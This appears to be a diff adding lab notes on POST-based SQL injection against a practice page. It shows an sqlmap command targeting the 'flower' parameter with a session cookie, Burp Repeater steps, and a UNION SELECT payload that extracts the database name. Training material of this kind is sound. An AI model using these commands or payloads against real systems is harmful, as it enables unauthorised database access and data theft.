@@ -1,0 +1,19 @@
+-> Post-Based-SQL-Injection-Variant-1
+
+Initially we were injecting in the GET parameters which are specified in the URL itself and can be simply passed to SQLmap using the "-u".
+
+Here the data is being transferred via POST request. To specify using POST, we use --method and to specify the POST parameters, we use --data
+
+So, as method is POST we pass --method=POST And as the POST parameter being sent is "flower" with a default value of Orchids, we use: --data="flower=Orchids"
+
+sqlmap -u "http://URL/SQL-Injection/Post-Based-SQL-Injection-Variant-1/details.php" --data="flower=lilly" -p flower --method=POST --cookie "key=value; PHPSESSID=value"
+
+This tells SQLmap to attack [URL] and perform injection in the "flower" parameter in a POST request.
+
+Capture request in Burp -> Proxy -> History
+
+Send the POST request it to Repeater
+
+In flower parameter:
+
+flower=orchids'+union+select database(),database(),database(),database()--+
